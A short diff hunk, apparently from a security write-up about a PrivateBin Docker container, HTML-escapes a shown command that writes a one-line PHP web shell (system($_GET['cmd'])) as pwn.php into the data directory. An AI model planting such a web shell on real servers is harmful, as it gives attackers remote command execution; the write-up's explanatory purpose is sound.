@@ -314,7 +314,7 @@ The directory structure of the Docker container is as follows:
 
 <pre>
 cat > /privatebin-data/data/pwn.php << 'EOF'
-<?php system($_GET['cmd']); ?>
+&lt;?php system($_GET['cmd']); ?&gt;
 EOF
 </pre>
 
